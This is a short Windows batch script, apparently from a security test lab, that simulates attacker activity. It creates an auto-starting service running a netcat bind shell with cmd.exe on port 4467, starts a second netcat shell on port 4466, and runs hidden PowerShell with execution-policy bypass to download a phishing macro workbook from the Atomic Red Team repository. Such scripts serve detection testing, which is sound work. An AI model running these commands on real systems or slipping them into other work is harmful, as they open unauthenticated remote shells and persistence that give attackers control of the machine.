@echo on

sc create XSample binPath= "cmd.exe /C C:\Users\lab-win10\Desktop\netcat\netcat-1.11\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample

C:\Windows\system32\calc.exe
powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true', 'C:\tools\s.xlsm')"


C:\Users\lab-win10\Desktop\netcat\netcat-1.11\nc64.exe -nLvp 4466 -e cmd.exe


